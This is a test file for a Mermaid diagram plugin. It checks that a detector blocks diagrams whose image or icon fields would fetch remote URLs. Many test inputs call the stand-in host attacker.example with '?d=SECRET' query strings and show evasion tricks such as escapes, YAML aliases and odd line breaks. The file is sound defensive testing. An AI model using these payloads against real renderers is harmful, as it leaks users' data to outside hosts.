/**
 * A node's `img:` shape data makes Mermaid load the picture in the page while it draws,
 * before the plugin turns the SVG into a sandboxed image. A diagram asking for one from
 * somewhere is not handed to Mermaid at all.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { aparteGlobalConfig, type AparteCodeLanguageContext } from '@aparte/core';
import { setupMermaidWith, type MermaidLike } from './core.js';
import { fetchesImage } from './shape-data.js';

const BOX = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 60"><g><text>A</text></g></svg>';

describe('fetchesImage', () => {
    it.each([
        ['an https url', 'flowchart LR\n  A@{ img: "https://attacker.example/p?d=SECRET", label: "x", shape: imageSquare }'],
        ['an http url', 'flowchart LR\n  A@{ shape: imageSquare, img: "http://attacker.example/p" }'],
        ['a protocol-relative url', 'flowchart LR\n  A@{ img: "//attacker.example/p" }'],
        ['a relative path', 'flowchart LR\n  A@{ img: "/track?d=SECRET" }'],
        ['an unquoted value', 'flowchart LR\n  A@{ img: https://attacker.example/p, label: x }'],
        ['single quotes', "flowchart LR\n  A@{ img: 'https://attacker.example/p' }"],
        ['a quoted key', 'flowchart LR\n  A@{ "img": "https://attacker.example/p" }'],
        ['a spaced key', 'flowchart LR\n  A@{ img : "https://attacker.example/p" }'],
        ['one key per line', 'flowchart LR\n  A@{\n    shape: imageSquare\n    img: "https://attacker.example/p"\n  }'],
        ['a second node', 'flowchart LR\n  A@{ label: "ok" }\n  B@{ img: "https://attacker.example/p" }'],
        ['a } inside a label before it', 'flowchart LR\n  A@{ label: "a}b", img: "https://attacker.example/p" }'],
        ['a block never closed', 'flowchart LR\n  A@{ img: "https://attacker.example/p"'],
        ['a scheme spelled with an escape', 'flowchart LR\n  A@{ img: "\\x68ttps://attacker.example/p" }'],
        ['a key spelled with an escape', 'flowchart LR\n  A@{ "\\u0069mg": "https://attacker.example/p" }'],
        ['a data: that is not an image', 'flowchart LR\n  A@{ img: "data:text/html,<p>x</p>" }'],
        ['an upper-case key', 'flowchart LR\n  A@{ IMG: "https://attacker.example/p" }'],
        // Read by mermaid's lexer and YAML, not by a text scan of the blocks:
        ['an explicit key with a comment', 'flowchart LR\n  A@{\n    ? img # note\n    : "https://attacker.example/p"\n  }'],
        ['an alias used as the key', 'flowchart LR\n  A@{ label: &k img, *k : "https://attacker.example/p" }'],
        ['a mermaid comment holding @{ and a quote', 'flowchart LR\n  %% @{ "\n  A@{ label: "x}", img: "https://attacker.example/p" }'],
        ['a label holding @{ and a quote', 'flowchart LR\n  B["@{"]\n  A@{ label: "x}", img: "https://attacker.example/p" }'],
        ['an escaped line break inside the key', 'flowchart LR\n  A@{ "im\\\ng": "https://attacker.example/p" }'],
        ['a second img after an inline one', 'flowchart LR\n  A@{ img: "data:image/png;base64,AAAA", img: "https://attacker.example/p" }'],
        ['an img that only mentions the word', 'flowchart LR\n  A@{ label: "my img file" }'],
        // A matched `img:"data:image/` is not always a real entry, so nothing is skipped after it:
        ['a quote opened in a plain scalar', 'flowchart LR\n  A@{ k: img:"data:image/x, img: https://attacker.example/plain?d=S, y: a"b }'],
        ['the same with single quotes', "flowchart LR\n  A@{ k: img:'data:image/x, img: https://attacker.example/single?d=S, y: a'b }"],
        ['an inline-looking entry in a YAML comment', "flowchart LR\n  A@{\n# img: 'data:image/x\nimg: https://attacker.example/comment?d=S\nz: ''\n}"],
        ['an inline-looking entry in a mermaid comment', "%% img: 'data:image/x\nflowchart LR\n  A@{ img: https://attacker.example/mm?d=S, z: '' }"],
        ['an inline-looking entry in a label', "flowchart LR\n  B[\"img: 'data:image/x\"]\n  A@{ img: https://attacker.example/label?d=S, z: '' }"],
        ['an img right after the comma of a data url', 'flowchart LR\n  A@{ k: data:image/png;base64,img: https://attacker.example/p }'],
        // Mermaid reads a lone CR (and YAML a few other characters) as a line break:
        ['a backslash before a lone CR', 'flowchart TD\n  A@{ { a: "\\"", ? "im\\\rg": "https://attacker.example/cr" } #" }'],
        ['a backslash before a U+2028', 'flowchart TD\n  A@{ "im\\\u2028g": "https://attacker.example/ls" }'],
        // An anchor on a key in one mapping, an alias for the key in another:
        ['an anchor on an inline key reused as an alias', 'flowchart LR\n  A@{\n    x:\n      &k img: "data:image/png;base64,AA"\n    *k : "https://attacker.example/alias"\n  }'],
        ['the same in one line', 'flowchart LR\n  A@{ x: [ &k img: "data:image/png;base64,AA" ], *k : "https://attacker.example/alias" }'],
        // The second field that fetches:
        ['a sequence actor icon', 'sequenceDiagram\nparticipant A\nproperties A: {"icon": "https://attacker.example/seq?d=S"}\nA->>A: hi'],
        ['an actor icon after end on the same line', 'sequenceDiagram\nloop x\nA->>A: hi\nend properties A: {"icon": "https://attacker.example/seq"}'],
        ['an actor icon after a semicolon', 'sequenceDiagram\nA->>A: hi; PROPERTIES A: {"\\u0069con": "https://attacker.example/seq"}'],
        ['an actor icon read from the page by details', 'sequenceDiagram\nparticipant A\ndetails A: cfg-json\nA->>A: hi'],
    ])('refuses %s', (_what, source) => {
        expect(fetchesImage(source)).toBe(true);
    });

    it.each([
        ['no shape data', 'flowchart LR\n  A --> B'],
        ['shape data with no picture', 'flowchart LR\n  A@{ shape: rect, label: "Start" }'],
        ['an inline png', 'flowchart LR\n  A@{ img: "data:image/png;base64,iVBORw0KGgo=", label: "x", shape: imageSquare }'],
        ['an inline svg', 'flowchart LR\n  A@{ img: "data:image/svg+xml;utf8,<svg/>" }'],
        ['the word in a label', 'flowchart LR\n  A["img: not a key"] --> B'],
        ['a base64 picture that holds the letters img', 'flowchart LR\n  A@{ img: "data:image/png;base64,AAimgBB==", shape: imageSquare }'],
        ['two inline pictures', 'flowchart LR\n  A@{ img: "data:image/png;base64,AAAA" }\n  B@{ img: data:image/svg+xml;base64,AAAA, label: x }'],
        ['a \\n in a label', 'flowchart LR\n  A@{ label: "two\\nlines" }'],
        ['the word inside a longer word', 'flowchart LR\n  A@{ shape: cyl } --> B[Upload to imgur]'],
        ['an img folder', 'flowchart LR\n  A[src/img/logo.png] --> B@{ shape: doc }'],
        ['a sequence diagram with no properties', 'sequenceDiagram\nparticipant A\nA->>A: hi'],
        ['a flowchart node called properties', 'flowchart LR\n  properties --> B'],
    ])('lets through %s', (_what, source) => {
        expect(fetchesImage(source)).toBe(false);
    });

    it('stays fast on a long source', () => {
        const long = '@{ ' + 'img'.repeat(20_000) + ' ' .repeat(20_000) + 'x';
        const started = performance.now();
        fetchesImage(long);
        fetchesImage('@{ "' + ' img: '.repeat(20_000));
        expect(performance.now() - started).toBeLessThan(200);
    });
});

describe('the renderer', () => {
    afterEach(() => {
        aparteGlobalConfig.reset();
        document.body.innerHTML = '';
    });

    function drawn() {
        const calls = { parse: 0, render: 0 };
        const mermaid: MermaidLike = {
            initialize: () => {},
            parse: () => { calls.parse++; return Promise.resolve(true); },
            render: () => { calls.render++; return Promise.resolve({ svg: BOX }); },
        };
        setupMermaidWith(mermaid);
        const host = document.createElement('code');
        document.body.append(host);
        const ctx = (source: string): AparteCodeLanguageContext =>
            ({ language: 'mermaid', source, display: true, open: false, host, config: aparteGlobalConfig });
        return { calls, draw: (source: string) => aparteGlobalConfig.getCodeLanguageRenderer('mermaid')!.render(ctx(source)) };
    }

    it('never reaches render() with a remote img, and shows the source instead', async () => {
        const { calls, draw } = drawn();
        const html = await draw('flowchart LR\n  A@{ img: "https://attacker.example/p?d=SECRET", shape: imageSquare }');
        expect(calls).toEqual({ parse: 0, render: 0 });
        expect(html).toContain('aparte-code-error');
        expect(html).not.toContain('<img');
    });

    it('still draws an inline picture', async () => {
        const { calls, draw } = drawn();
        const html = await draw('flowchart LR\n  A@{ img: "data:image/png;base64,iVBORw0KGgo=", shape: imageSquare }');
        expect(calls).toEqual({ parse: 1, render: 1 });
        expect(html).toContain('aparte-diagram');
    });
});
